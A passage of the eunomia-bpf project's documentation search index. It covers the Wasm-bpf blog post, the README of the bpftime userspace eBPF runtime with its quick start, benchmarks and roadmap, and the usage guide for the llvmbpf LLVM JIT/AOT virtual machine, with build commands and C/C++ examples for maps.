and user states, with the user state accessing system resources through traditional system calls and the kernel state interacting with various parts of the system through BPF Helper Calls. As of early 2023, there are more than 220 Helper System Interfaces in the eBPF virtual machine in the kernel, covering a very wide range of application scenarios.</p> <p>It is important to note that BPF Helper Calls and System Calls are not in competition with each other; they have completely different programming models and scenarios where they have performance benefits, and they do not completely replace each other. The situation is similar for the Wasm and Wasi related ecosystems, where a specially designed wasi interface requires a lengthy standardization process but may yield better performance and portability guarantees for user-state applications in specific scenarios, while eBPF provides a fast and flexible solution for extending the system interface while maintaining the sandbox nature and portability.</p> <p>The eBPF is still in its early stages, but with the ability to interact between the kernel and user state provided by the current eBPF, applications in the Wasm VM can already obtain data and return values (kprobe, uprobe, ...) from almost any function call in the kernel and user state via the Wasm-bpf system interface transformation. ; collect and understand all system calls and obtain packet and socket level data for all network operations at a very low cost (tracepoint, socket...) Add additional protocol analyzers to the network packet processing solution and easily program any forwarding logic (XDP, TC...) ) to meet changing needs without leaving the packet processing environment of the Linux kernel.</p> <p>Moreover, eBPF has the ability to write data to any address of any process in user space (bpf_probe_write_user[5]), to modify the return value of kernel functions to a limited extent (bpf_override_return[6]), and even to execute some system calls directly in the kernel state [7]; fortunately, eBPF performs a bytecode analysis before loading into the Fortunately, eBPF performs strict security checks on the bytecode before loading it into the kernel to ensure that there are no memory out-of-bounds or other operations, while many features that may expand the attack surface and pose security risks need to be explicitly chosen to be enabled at compile time before the kernel can be used; certain eBPF features can also be explicitly chosen to be enabled or disabled before the Wasm VM loads the bytecode into the kernel to ensure the security of the sandbox.</p> <p>All of these scenarios do not require leaving the Wasm lightweight container: unlike traditional applications that use Wasm as a data processing or control plug-in, where these steps are implemented by logic outside the Wasm VM, it is now possible to achieve complete control and interaction with eBPF and almost all system resources that eBPF can access, even generating eBPF in real time, from within the Wasm lightweight container code to change the behavior logic of the kernel, enabling programmability of the entire system from the user state to the kernel state.</p>"},{"location":"blogs/wasm-bpf/#interaction-flow-between-user-space-and-ebpf-programs","title":"Interaction flow between user space and eBPF programs","text":"<p>eBPF programs are function-based and event-driven, and a specific eBPF program is run when a kernel or user space application passes a hook point. To use an eBPF program, we first need to compile the corresponding source code into bpf bytecode using the clang/LLVM toolchain, which contains the corresponding data structure definitions, maps and progs definitions. progs are program segments, and maps can be used to store data or for bidirectional communication with the user space. After that, we can implement a complete eBPF application with the help of the user state development framework and the loading framework.</p>"},{"location":"blogs/wasm-bpf/#common-user-state-ebpf-development-framework","title":"Common user-state eBPF development framework","text":"<p>For a complete eBPF application, there are usually two parts: the user state and the kernel state.</p> <ul> <li>The user state program needs to interact with the kernel through a series of system calls (mainly bpf system calls), create a corresponding map to store data in the kernel state or to communicate with the user state, dynamically select different segments to load according to the configuration, dynamically modify the bytecode or configure the parameters of the eBPF program, load the corresponding bytecode information into the kernel, ensure security through validators, and communicate with the kernel through maps and the kernel, passing data from the kernel state to the user state (or vice versa) through mechanisms such as ring buffer / perf buffer.</li> <li>The kernel state is mainly responsible for the specific computational logic and data collection.</li> </ul>"},{"location":"blogs/wasm-bpf/#a-new-ebpf-development-framework-defined-on-top-of-the-user-state-wasm-ebpf-system-interface","title":"A new eBPF development framework defined on top of the user-state Wasm-eBPF system interface","text":"<p>The project essentially wants to treat the Wasm sandbox as an alternative user-state runtime space on top of the OS, allowing Wasm applications to implement the same programming model and execution logic in the sandbox as eBPF applications that normally run in the user state.</p> <p>Wasm-bpf would require a runtime module built on top of the host (outside the sandbox), and some runtime libraries compiled to Wasm bytecode inside the sandbox to provide complete support.</p> <p></p> <p>To achieve a complete development model, we need.</p> <ul> <li>a Wasm module can correspond to multiple eBPF procedures.</li> <li>an instance of an eBPF procedure can also be shared by multiple Wasm modules</li> <li>The ability to dynamically load eBPF programs from the Wasm sandbox into the kernel, select the desired mount points to mount them, unmount them, control the complete lifecycle of multiple eBPF bytecode objects, and support most eBPF program types.</li> <li>Bi-directional communication with the kernel via multiple types of Maps, with support for most types of Maps.</li> <li>Efficient sending of messages from the kernel state to the user state (and vice versa for ring buffering) via ring buffering and perf event polling.</li> <li>It can be adapted to almost any application scenario that uses eBPF programs, and can evolve and extend as kernel features are added, without requiring changes to the Wasm VM's system interface.</li> </ul> <p>This is what the Wasm-bpf project is currently working on. We have also proposed a new Proposal for WASI: WASI-eBPF [7].</p> <p>In the Wasm-bpf project, all communications between Wasm and eBPF VMs do not need to go through serialization and deserialization mechanisms, and with the support of code generation techniques and BTF (BPF type format [12]) information in the toolchain, we can achieve correct communication between eBPF and Wasm with potentially different structure in vivo layouts, different size end mechanisms, different pointer widths The data can be copied directly from the kernel state to the memory of the Wasm VM when communicating through eBPF Maps, avoiding the extra loss caused by multiple copies. At the same time, the eBPF-Wasm development experience for user-state programs is greatly improved by automatically generating skeleton (bpf code framework) and type definitions.</p> <p>Thanks to the CO-RE (Compile-Once, Run Everywhere) technology provided by libbpf, porting eBPF bytecode objects between different kernel versions does not introduce an additional recompilation process, nor is there any LLVM/Clang dependency at runtime [12].</p> <p>Typically a compiled eBPF-Wasm module is only about 90Kb and can be dynamically loaded into the kernel and executed in less than 100ms. We also provide several examples in our repository, corresponding to various scenarios such as observable, network, and security.</p> <p>We would like to thank Associate Professor Xiaozheng Lai from South China University of Technology, Professor Lijun Chen's team from Xi'an University of Posts and Telecommunications, and teachers Pu Wang and Jicheng Shi from Datan Technology for their guidance and help in combining Wasm and eBPF. blog, we will give a more detailed analysis of the principle and performance, as well as some code examples.</p> <p>The Wasm-bpf compilation toolchain and runtime modules are currently developed and maintained by the eunomia-bpf open source community, and we thank the PLCT Lab of the Institute of Software of the Chinese Academy of Sciences for their support and funding, and our fellow community members for their contributions. Next, we will also improve and explore more on the corresponding eBPF and Wasm related toolchain and runtime, and actively feed back and contribute to the upstream community.</p>"},{"location":"blogs/wasm-bpf/#references","title":"References","text":"<ul> <li>[1] wasm-bpf Github open source address: https://github.com/eunomia-bpf/wasm-bpf</li> <li>[2] When Wasm meets eBPF: Writing, distributing, loading and running eBPF programs using WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>[3] https://ebpf.io/</li> <li>[4] What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>[5] Offensive BPF: Understanding and using bpf_probe_write_user https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf</li> <li>[6] Cloud Native Security Attack and Defense\uff5cAnalysis and practice of escape container technology using eBPF: https://security.tencent.com/index.php/blog/msg/206</li> <li>[7] kernel-versions.md: https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md</li> <li>[8] WebAssembly: Docker without containers: https://zhuanlan.zhihu.com/p/595257541</li> <li>[9] Introduction to WebAssembly, a tool for scalability in cloud-native projects https://mp.weixin.qq.com/s/fap0bl6GFGi8zN5BFLpkCw</li> <li>[10] WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>[11] BPF BTF Explained: https://www.ebpf.top/post/kernel_btf/</li> <li>[12] BPF portability and CO-RE (compile once, run everywhere): https://cloud.tencent.com/developer/article/1802154</li> </ul> <p>Share on  Share on </p>"},{"location":"bpftime/","title":"bpftime: Userspace eBPF runtime for Observability, Network &amp; General extensions Framework","text":"<p><code>bpftime</code> is a High-Performance userspace eBPF runtime and General Extension Framework designed for userspace. It enables faster Uprobe, USDT, Syscall hooks, XDP, and more event sources by bypassing the kernel and utilizing an optimized compiler like <code>LLVM</code>.</p> <p>\ud83d\udce6 Key Features \\ \ud83d\udd28 Quick Start \\ \ud83d\udd0c Examples &amp; Use Cases \\ \u2328\ufe0f Linux Plumbers 23 talk \\ \ud83d\udcd6 Slides \\ \ud83d\udcda Arxiv preprint</p> <p>Checkout our documents in eunomia.dev!</p> <p>bpftime is not <code>userspace eBPF VM</code>, it's a userspace runtime framework includes everything to run eBPF in userspace: <code>loader</code>, <code>verifier</code>, <code>helpers</code>, <code>maps</code>, <code>ufunc</code> and multiple <code>events</code> such as Observability, Network, Policy or Access Control. It has multiple VM backend options support. For eBPF VM only, please see llvmbpf.</p> <p>\u26a0\ufe0f Note: <code>bpftime</code> is currently under active development and refactoring towards v2. It may contain bugs or unstable API. Please use it with caution. For more details, check our roadmap. We'd love to hear your feedback and suggestions! Feel free to open an issue or Contact us.</p>"},{"location":"bpftime/#why-bpftime-whats-the-design-goal","title":"Why bpftime? What's the design Goal?","text":"<ul> <li>Performance Gains: Achieve better performance by <code>bypassing the kernel</code> (e.g., via <code>Userspace DBI</code> or <code>Network Drivers</code>), with more configurable, optimized and more arch supported JIT/AOT options like <code>LLVM</code>, while maintaining compatibility with Linux kernel eBPF.</li> <li>Cross-Platform Compatibility: Enables <code>eBPF functionality and large ecosystem</code> where kernel eBPF is unavailable, such as on older or alternative operating systems, or where kernel-level permissions are restricted, without changing your tool.</li> <li>Flexible and General Extension Language &amp; Runtime for Innovation: eBPF is designed for innovation, evolving into a General Extension Language &amp; Runtime in production that supports very diverse use cases. <code>bpftime</code>'s modular design allows easy integration as a library for adding new events and program types without touching kernel. Wishing it could enable rapid prototyping and exploration of new features!</li> </ul>"},{"location":"bpftime/#key-features","title":"Key Features","text":"<ul> <li>Dynamic Binary rewriting: Run eBPF programs in userspace, attaching them to <code>Uprobes</code> and <code>Syscall tracepoints</code>: No manual instrumentation or restart required!. It can <code>trace</code> or <code>change</code> the execution of a function, <code>hook</code> or <code>filter</code> all syscalls of a process safely, and efficiently with an eBPF userspace runtime. Can inject eBPF runtime into any running process without the need for a restart or manual recompilation.</li> <li>Performance: Experience up to a <code>10x</code> speedup in Uprobe overhead compared to kernel uprobe and uretprobe. Read/Write userspace memory is also faster than kernel eBPF.</li> <li>Interprocess eBPF Maps: Implement userspace <code>eBPF maps</code> in shared userspace memory for summary aggregation or control plane communication.</li> <li>Compatibility: use <code>existing eBPF toolchains</code> like clang, libbpf and bpftrace to develop userspace eBPF application without any modifications. Supporting CO-RE via BTF, and offering userspace <code>ufunc</code> access.</li> <li>Multi JIT Support: Support llvmbpf, a high-speed <code>JIT/AOT</code> compiler powered by LLVM, or using <code>ubpf JIT</code> and INTERPRETER. The vm can be built as <code>a standalone library</code> like ubpf.</li> <li>Run with kernel eBPF: Can load userspace eBPF from kernel, and using kernel eBPF maps to cooperate with kernel eBPF programs like kprobes and network filters.</li> <li>Integrate with AF_XDP or DPDK: Run your <code>XDP</code> network applications with better performance in userspace just like in kernel!(experimental)</li> </ul>"},{"location":"bpftime/#components","title":"Components","text":"<ul> <li><code>vm</code>: The eBPF VM and JIT compiler for bpftime, you can choose from bpftime LLVM JIT/AOT compiler and ubpf. The llvm-based vm in bpftime can also be built as a standalone library and integrated into other projects, similar to ubpf.</li> <li><code>runtime</code>: The userspace runtime for eBPF, including the maps, helpers, ufuncs and other runtime safety features.</li> <li><code>Attach events</code>: support attaching eBPF programs to <code>Uprobes</code>, <code>Syscall tracepoints</code>, <code>XDP</code> and other events with bpf_link, and also the driver event sources.</li> <li><code>verifier</code>: Support using PREVAIL as userspace verifier, or using <code>Linux kernel verifier</code> for better results.</li> <li><code>Loader</code>: Includes a <code>LD_PRELOAD</code> loader library in userspace can work with current eBPF toolchain and library without involving any kernel, Another option is daemon when Linux eBPF is available.</li> </ul>"},{"location":"bpftime/#quick-start-uprobe","title":"Quick Start: Uprobe","text":"<p>With <code>bpftime</code>, you can build eBPF applications using familiar tools like clang and libbpf, and execute them in userspace. For instance, the <code>malloc</code> eBPF program traces malloc calls using uprobe and aggregates the counts using a hash map.</p> <p>You can refer to eunomia.dev/bpftime/documents/build-and-test for how to build the project, or using the container images from GitHub packages.</p> <p>To get started, you can build and run a libbpf based eBPF program starts with <code>bpftime</code> cli:</p> <pre><code>make -C example/malloc # Build the eBPF program example\nexport PATH=$PATH:~/.bpftime/\nbpftime load ./example/malloc/malloc\n</code></pre> <p>In another shell, Run the target program with eBPF inside:</p> <pre><code>$ bpftime start ./example/malloc/victim\nHello malloc!\nmalloc called from pid 250215\ncontinue malloc...\nmalloc called from pid 250215\n</code></pre> <p>You can also dynamically attach the eBPF program with a running process:</p> <pre><code>$ ./example/malloc/victim &amp; echo $! # The pid is 101771\n[1] 101771\n101771\ncontinue malloc...\ncontinue malloc...\n</code></pre> <p>And attach to it:</p> <pre><code>$ sudo bpftime attach 101771 # You may need to run make install in root\nInject: \"/root/.bpftime/libbpftime-agent.so\"\nSuccessfully injected. ID: 1\n</code></pre> <p>You can see the output from original program:</p> <pre><code>$ bpftime load ./example/malloc/malloc\n...\n12:44:35 \n        pid=247299      malloc calls: 10\n        pid=247322      malloc calls: 10\n</code></pre> <p>Alternatively, you can also run our sample eBPF program directly in the kernel eBPF, to see the similar output. This can be an example of how bpftime can work compatibly with kernel eBPF.</p> <pre><code>$ sudo example/malloc/malloc\n15:38:05\n        pid=30415       malloc calls: 1079\n        pid=30393       malloc calls: 203\n        pid=29882       malloc calls: 1076\n        pid=34809       malloc calls: 8\n</code></pre> <p>See eunomia.dev/bpftime/documents/usage for more details.</p>"},{"location":"bpftime/#examples-use-cases","title":"Examples &amp; Use Cases","text":"<p>For more examples and details, please refer to eunomia.dev/bpftime/documents/examples/ webpage.</p> <p>Examples including:</p> <ul> <li>Minimal examples of eBPF programs.</li> <li>eBPF <code>Uprobe/USDT</code> tracing and <code>syscall tracing</code>:</li> <li>sslsniff for trace SSL/TLS unencrypted data.</li> <li>opensnoop for trace file open syscalls.</li> <li>More bcc/libbpf-tools.</li> <li>Run with bpftrace commands or scripts.</li> <li>error injection: change function behavior with <code>bpf_override_return</code>.</li> <li>Use the eBPF LLVM JIT/AOT vm as a standalone library.</li> <li>Userspace XDP with DPDK and AF_XDP</li> </ul>"},{"location":"bpftime/#in-depth","title":"In-Depth","text":""},{"location":"bpftime/#how-it-works","title":"How it Works","text":"<p>bpftime supports two modes:</p>"},{"location":"bpftime/#running-in-userspace-only","title":"Running in userspace only","text":"<p>Left: original kernel eBPF | Right: bpftime</p> <p></p> <p>In this mode, bpftime can run eBPF programs in userspace without kernel, so it can be ported into low version of Linux or event other systems, and running without root permissions. It relies on a userspace verifier to ensure the safety of eBPF programs.</p>"},{"location":"bpftime/#run-with-kernel-ebpf","title":"Run with kernel eBPF","text":"<p>In this mode, bpftime can run together with kernel eBPF. It can load eBPF programs from kernel, and using kernel eBPF maps to cooperate with kernel eBPF programs like kprobes and network filters.</p>"},{"location":"bpftime/#instrumentation-implementation","title":"Instrumentation implementation","text":"<p>Current hook implementation is based on binary rewriting and the underly technique is inspired by:</p> <ul> <li>Userspace function hook: frida-gum</li> <li>Syscall hooks: zpoline and pmem/syscall_intercept.</li> </ul> <p>The hook can be easily replaced with other DBI methods or frameworks, or add more hook mechanisms in the future.</p> <p>See our draft arxiv paper bpftime: userspace eBPF Runtime for Uprobe, Syscall and Kernel-User Interactions for details.</p>"},{"location":"bpftime/#performance-benchmarks","title":"Performance Benchmarks","text":"<p>How is the performance of <code>userspace uprobe</code> compared to <code>kernel uprobes</code>?</p> Probe/Tracepoint Types Kernel (ns) Userspace (ns) Uprobe 3224.172760 314.569110 Uretprobe 3996.799580 381.270270 Syscall Tracepoint 151.82801 232.57691 Manually Instrument Not avaliable 110.008430 <p>It can be attached to functions in running process just like the kernel uprobe does.</p> <p>How is the performance of LLVM JIT/AOT compared to other eBPF userspace runtimes, native code or wasm runtimes?</p> <p></p> <p>Across all tests, the LLVM JIT for bpftime consistently showcased superior performance. Both demonstrated high efficiency in integer computations (as seen in log2_int), complex mathematical operations (as observed in prime), and memory operations (evident in memcpy and strcmp). While they lead in performance across the board, each runtime exhibits unique strengths and weaknesses. These insights can be invaluable for users when choosing the most appropriate runtime for their specific use-cases.</p> <p>see github.com/eunomia-bpf/bpf-benchmark for how we evaluate and details.</p> <p>Hash map or ring buffer compared to kernel(TODO)</p> <p>See benchmark dir for detail performance benchmarks.</p>"},{"location":"bpftime/#comparing-with-kernel-ebpf-runtime","title":"Comparing with Kernel eBPF Runtime","text":"<ul> <li><code>bpftime</code> allows you to use <code>clang</code> and <code>libbpf</code> to build eBPF programs, and run them directly in this runtime, just like normal kernel eBPF. We have tested it with a libbpf version in third_party/libbpf. No specify libbpf or clang version needed.</li> <li>Some kernel helpers and kfuncs may not be available in userspace.</li> <li>It does not support direct access to kernel data structures or functions like <code>task_struct</code>.</li> </ul> <p>Refer to eunomia.dev/bpftime/documents/available-features for more details.</p>"},{"location":"bpftime/#build-and-test","title":"Build and test","text":"<p>See eunomia.dev/bpftime/documents/build-and-test for details.</p>"},{"location":"bpftime/#roadmap","title":"Roadmap","text":"<p><code>bpftime</code> is continuously evolving with more features in the pipeline:</p> <ul> <li> Keep compatibility with the evolving kernel</li> <li> Refactor for General Extension Framework</li> <li> Trying to refactor, bug fixing for <code>Production</code>.</li> <li> More examples and usecases:</li> <li> Userspace Network Driver on userspace eBPF</li> <li> Hotpatch userspace application</li> <li> Error injection and filter syscall</li> <li> Syscall bypassing, batching</li> <li> Userspace Storage Driver on userspace eBPF</li> <li> etc...</li> </ul> <p>Stay tuned for more developments from this promising project! You can find <code>bpftime</code> on GitHub.</p>"},{"location":"bpftime/#license","title":"License","text":"<p>This project is licensed under the MIT License.</p>"},{"location":"bpftime/#contact-and-citations","title":"Contact and citations","text":"<p>Have any questions or suggestions on future development? Free free to open an issue or contact yunwei356@gmail.com !</p> <p>Our arxiv preprint: https://arxiv.org/abs/2311.07923</p> <pre><code>@misc{zheng2023bpftime,\n      title={bpftime: userspace eBPF Runtime for Uprobe, Syscall and Kernel-User Interactions}, \n      author={Yusheng Zheng and Tong Yu and Yiwei Yang and Yanpeng Hu and XiaoZheng Lai and Andrew Quinn},\n      year={2023},\n      eprint={2311.07923},\n      archivePrefix={arXiv},\n      primaryClass={cs.OS}\n}\n</code></pre>"},{"location":"bpftime/#acknowledgement","title":"Acknowledgement","text":"<p>eunomia-bpf community is sponsored by PLCT Lab from ISCAS.</p> <p>Thanks for other sponsors and discussions help building this project: Prof. Marios Kogias from Imperial College London, Prof. Xiaozheng lai from SCUT, Prof lijun chen from XUPT, Prof. Qi Li from THU NISL Lab, and Linux eBPF maintainers in the LPC 23 eBPF track.</p> <p>Share on  Share on </p>"},{"location":"bpftime/llvmbpf/","title":"Userspace eBPF VM with LLVM JIT/AOT Compiler","text":"<p>A high-performance, multi-architecture JIT/AOT compiler and virtual machine (VM) based on LLVM.</p> <p>This component is part of the bpftime project but focuses solely on the core VM. It offers the following capabilities:</p> <ul> <li>Operates as <code>a standalone eBPF VM library</code> or compiler tool.</li> <li>Compiles eBPF bytecode into LLVM IR files.</li> <li>Compiles eBPF ELF files into AOTed native code ELF object files, which can be linked like C-compiled objects or loaded into llvmbpf.</li> <li>Loads and executes AOT-compiled ELF object files within the eBPF runtime.</li> <li>Supports eBPF helpers and maps lddw functions.</li> </ul> <p>This library is optimized for performance, flexibility, and minimal dependencies. It does not include maps implement, helpers, verifiers, or loaders for eBPF applications, making it suitable as a lightweight, high-performance library.</p> <p>For a comprehensive userspace eBPF runtime that includes support for maps, helpers, and seamless execution of Uprobe, syscall trace, XDP, and other eBPF programs\u2014similar to kernel functionality but in userspace\u2014please refer to the bpftime project.</p> <ul> <li>Userspace eBPF VM with LLVM JIT/AOT Compiler</li> <li>build project</li> <li>Usage<ul> <li>Use llvmbpf as a library</li> <li>Use llvmbpf as a AOT compiler</li> <li>load eBPF bytecode from ELF file</li> <li>Maps and data relocation support</li> <li>Build into standalone binary for deployment</li> </ul> </li> <li>optimizaion<ul> <li>inline the maps and helper function</li> <li>Use original LLVM IR from C code</li> </ul> </li> <li>Test<ul> <li>Unit test</li> <li>Test with bpf-conformance</li> </ul> </li> <li>License</li> </ul>"},{"location":"bpftime/llvmbpf/#build-project","title":"build project","text":"<pre><code>sudo apt install llvm-15-dev libzstd-dev\ncmake -B build -DCMAKE_BUILD_TYPE=Release\ncmake --build build --target all -j\n</code></pre>"},{"location":"bpftime/llvmbpf/#usage","title":"Usage","text":""},{"location":"bpftime/llvmbpf/#use-llvmbpf-as-a-library","title":"Use llvmbpf as a library","text":"<p>See example of how to use the library as a vm:</p> <pre><code>void run_ebpf_prog(const void *code, size_t code_len)\n{\n    uint64_t res = 0;\n    llvmbpf_vm vm;\n\n    res = vm.load_code(code, code_len);\n    if (res) {\n        return;\n    }\n    vm.register_external_function(2, \"print\", (void *)ffi_print_func);\n    auto func = vm.compile();\n    if (!func) {\n        return;\n    }\n    int err = vm.exec(&amp;bpf_mem, sizeof(bpf_mem), res);\n    if (err != 0) {\n        return;\n    }\n    printf(\"res = %\" PRIu64 \"\\n\", res);\n}\n</code></pre>"},{"location":"bpftime/llvmbpf/#use-llvmbpf-as-a-aot-compiler","title":"Use llvmbpf as a AOT compiler","text":"<p>Build with cli:</p> <pre><code>sudo apt-get install libelf1 libelf-dev\ncmake -B build  -DBUILD_LLVM_AOT_CLI=1 \n</code></pre> <p>You can use the cli to generate the LLVM IR from eBPF bytecode:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o -emit-llvm &gt; test.bpf.ll\n# opt -O3 -S test.bpf.ll -opaque-pointers  -o test.opt.ll\n# cat test.opt.ll\n; ModuleID = 'test.bpf.ll'\nsource_filename = \"bpf-jit\"\n\n; Function Attrs: nofree norecurse nosync nounwind memory(read, inaccessiblemem: none)\ndefine i64 @bpf_main(ptr %0, i64 %1) local_unnamed_addr #0 {\nsetupBlock:\n  %2 = ptrtoint ptr %0 to i64\n  %3 = load i32, ptr %0, align 4\n  %4 = icmp slt i32 %3, 1\n  br i1 %4, label %bb_inst_30, label %bb_inst_15\n\nbb_inst_15:                                       ; preds = %setupBlock, %bb_inst_15\n  %storemerge32 = phi i32 [ %11, %bb_inst_15 ], [ 1, %setupBlock ]\n  %stackBegin29.sroa.2.031 = phi i32 [ %10, %bb_inst_15 ], [ 0, %setupBlock ]\n  %5 = sext i32 %storemerge32 to i64\n  %6 = shl nsw i64 %5, 2\n  %7 = add i64 %6, %2\n  %8 = inttoptr i64 %7 to ptr\n  %9 = load i32, ptr %8, align 4\n  %10 = add i32 %9, %stackBegin29.sroa.2.031\n  %11 = add i32 %storemerge32, 1\n  %12 = icmp sgt i32 %11, %3\n  br i1 %12, label %bb_inst_30, label %bb_inst_15\n\nbb_inst_30:                                       ; preds = %bb_inst_15, %setupBlock\n  %stackBegin29.sroa.2.0.lcssa = phi i32 [ 0, %setupBlock ], [ %10, %bb_inst_15 ]\n  %13 = zext i32 %stackBegin29.sroa.2.0.lcssa to i64\n  ret i64 %13\n}\n\nattributes #0 = { nofree norecurse nosync nounwind memory(read, inaccessiblemem: none) }\n</code></pre> <p>AOT Compile a eBPF program:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o\n[2024-08-10 14:54:06.453] [info] [main.cpp:56] Processing program test\n[2024-08-10 14:54:06.479] [info] [main.cpp:69] Program test written to ./test.o\n</code></pre> <p>Load and run a AOTed eBPF program:</p> <pre><code># echo \"AwAAAAEAAAACAAAAAwAAAA==\" | base64 -d &gt; test.bin\n# ./build/cli/bpftime-vm run test.o test.bin\n[2024-08-10 14:57:16.986] [info] [llvm_jit_context.cpp:392] LLVM-JIT: Loading aot object\n[2024-08-10 14:57:16.991] [info] [main.cpp:136] Program executed successfully. Return value: 6\n</code></pre> <p>See Build into standalone binary for deployment for more details.</p>"},{"location":"bpftime/llvmbpf/#load-ebpf-bytecode-from-elf-file","title":"load eBPF bytecode from ELF file","text":"<p>You can use llvmbpf together with libbpf to load the eBPF bytecode directly from <code>bpf.o</code> ELF file. For example:</p> <pre><code>  bpf_object *obj = bpf_object__open(ebpf_elf.c_str());\n  if (!obj) {\n    return 1;\n  }\n  std::unique_ptr&lt;bpf_object, decltype(&amp;bpf_object__close)&gt; elf(\n    obj, bpf_object__close);\n\n  bpf_program *prog;\n  for ((prog) = bpf_object__next_program((elf.get()), __null);\n       (prog) != __null;\n       (prog) = bpf_object__next_program((elf.get()), (prog))) {\n    const char *name = bpf_program__name(prog);\n    llvmbpf_vm vm;\n\n    vm.load_code((const void *)bpf_program__insns(prog),\n         (uint32_t)bpf_program__insn_cnt(prog) * 8);\n  ...\n  }\n</code></pre> <p>For complete code example, please refer to cli.</p> <p>However, the <code>bpf.o</code> ELF file has no map and data relocation support. We would recommend using the bpftime to load and relocation the eBPF bytecode from ELF file. This include:</p> <ul> <li>Write a loader like normal kernel eBPF loader to load the eBPF bytecode, you can find a example here.</li> <li>The loader will use the libbpf, which support:</li> <li>Relocation for map. The map id will be allocated by the loader and bpftime, you can use the map id to access map through the helpers.</li> <li>The data can be accessed through the lddw helper function.</li> <li>After the loader load the eBPF bytecode and complete the relocation, you can use the bpftimetool to dump the map information and eBPF bytecode.</li> </ul>"},{"location":"bpftime/llvmbpf/#maps-and-data-relocation-support","title":"Maps and data relocation support","text":"<p>bpftime already has maps and data relocation support. The easiest way to use it is just use bpftime and write the loader and eBPF program like kernel eBPF. The <code>llvmbpf</code> libray provide a approach to interact with the maps.</p> <p>See example/maps.cpp of how to use the library as a vm and works with maps:</p> <p>The eBPF can work with maps in two ways:</p> <ul> <li>Using helper functions to access the maps, like <code>bpf_map_lookup_elem</code>, <code>bpf_map_update_elem</code>, etc.</li> <li>Using maps as global variables in the eBPF program, and access the maps directly.</li> </ul> <p>For a eBPF program like https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/:</p> <pre><code>// use map type define\nstruct {\n  __uint(type, BPF_MAP_TYPE_ARRAY);\n  __type(key, __u32);\n  __type(value, __u32);\n  __uint(max_entries, CTRL_ARRAY_SIZE);\n} ctl_array SEC(\".maps\");\n\n// use global variable define\n__u64 cntrs_array[CNTRS_ARRAY_SIZE];\n\nSEC(\"xdp\")\nint xdp_pass(struct xdp_md* ctx) {\n  void* data_end = (void*)(long)ctx-&gt;data_end;\n  void* data = (void*)(long)ctx-&gt;data;\n  __u32 ctl_flag_pos = 0;\n  __u32 cntr_pos = 0;\n\n  // access maps with helpers\n  __u32* flag = bpf_map_lookup_elem(&amp;ctl_array, &amp;ctl_flag_pos);\n  if (!flag || (*flag != 0)) {\n    return XDP_PASS;\n  };\n\n  // access maps with global variables\n  cntrs_array[cntr_pos]++;\n\n  if (data + sizeof(struct ethhdr) &gt; data_end)\n    return XDP_DROP;\n  swap_src_dst_mac(data);\n  return XDP_TX;\n}\n</code></pre> <p>We can define the map and access them like:</p> <pre><code>uint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *bpf_map_lookup_elem(uint64_t map_fd, void *key)\n{\n  std::cout &lt;&lt; \"bpf_map_lookup_elem \" &lt;&lt; map_fd &lt;&lt; std::endl;\n  if (map_fd == 5) {\n    return &amp;ctl_array[*(uint32_t *)key];\n  } else if (map_fd == 6) {\n    return &amp;cntrs_array[*(uint32_t *)key];\n  } else {\n    return nullptr;\n  }\n  return 0;\n}\n\nuint64_t map_by_fd(uint32_t fd)\n{\n  std::cout &lt;&lt; \"map_by_fd \" &lt;&lt; fd &lt;&lt; std::endl;\n  return fd;\n}\n\nuint64_t map_val(uint64_t val)\n{\n  std::cout &lt;&lt; \"map_val \" &lt;&lt; val &lt;&lt; std::endl;\n  if (val == 5) {\n    return (uint64_t)(void *)ctl_array;\n  } else if (val == 6) {\n    return (uint64_t)(void *)cntrs_array;\n  } else {\n    return 0;\n  }\n}\n\nint main(int argc, char *argv[])\n{\n  auto code = xdp_counter_bytecode;\n  size_t code_len = sizeof(xdp_counter_bytecode) - 1;\n  uint64_t res = 0;\n  llvmbpf_vm vm;\n\n  res = vm.load_code(code, code_len);\n  if (res) {\n    std::cout &lt;&lt; vm.get_error_message() &lt;&lt; std::endl;\n    exit(1);\n  }\n  vm.register_external_function(1, \"bpf_map_lookup_elem\",\n              (void *)bpf_map_lookup_elem);\n  // set the lddw helpers for accessing maps\n  vm.set_lddw_helpers(map_by_fd, nullptr, map_val, nullptr, nullptr);\n  auto func = vm.compile();\n  if (!func) {\n    std::cout &lt;&lt; vm.get_error_message() &lt;&lt; std::endl;\n    exit(1);\n  }\n  // Map value (counter) should be 0\n  std::cout &lt;&lt; \"cntrs_array[0] = \" &lt;&lt; cntrs_array[0] &lt;&lt; std::endl;\n  int err = vm.exec(&amp;bpf_mem, sizeof(bpf_mem), res);\n  std::cout &lt;&lt; \"\\nreturn value = \" &lt;&lt; res &lt;&lt; std::endl;\n  // counter should be 1\n  std::cout &lt;&lt; \"cntrs_array[0] = \" &lt;&lt; cntrs_array[0] &lt;&lt; std::endl;\n  ....\n}\n</code></pre> <p>Reference:</p> <ul> <li>https://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html</li> <li>https://www.ietf.org/archive/id/draft-ietf-bpf-isa-00.html#name-64-bit-immediate-instructio</li> </ul>"},{"location":"bpftime/llvmbpf/#build-into-standalone-binary-for-deployment","title":"Build into standalone binary for deployment","text":"<p>You can build the eBPF program into a standalone binary, which does not rely on any external libraries, and can be exec like nomal c code with helper and maps support.</p> <p>This can help:</p> <ul> <li>Easily deploy the eBPF program to any machine without the need to install any dependencies.</li> <li>Avoid the overhead of loading the eBPF bytecode and maps at runtime.</li> <li>Suitable for microcontroller or embedded systems, which does not have a OS.</li> </ul> <p>Take https://github.com/eunomia-bpf/bpftime/blob/master/example/xdp-counter/ as an example:</p> <p>In the bpftime project:</p> <pre><code># load the eBPF program with bpftime\nLD_PRELOAD=build/runtime/syscall-server/libbpftime-syscall-server.so example/xdp-counter/xdp-counter example/xdp-counter/.output/xdp-counter.bpf.o veth1\n# dump the map and eBPF bytecode define\n./build/tools/bpftimetool/bpftimetool export res.json\n# build the eBPF program into llvm IR\n./build/tools/aot/bpftime-aot compile --emit_llvm 1&gt;xdp-counter.ll\n</code></pre> <p>You can see example/xdp-counter.json for an example json file dump by bpftime.</p> <p>The 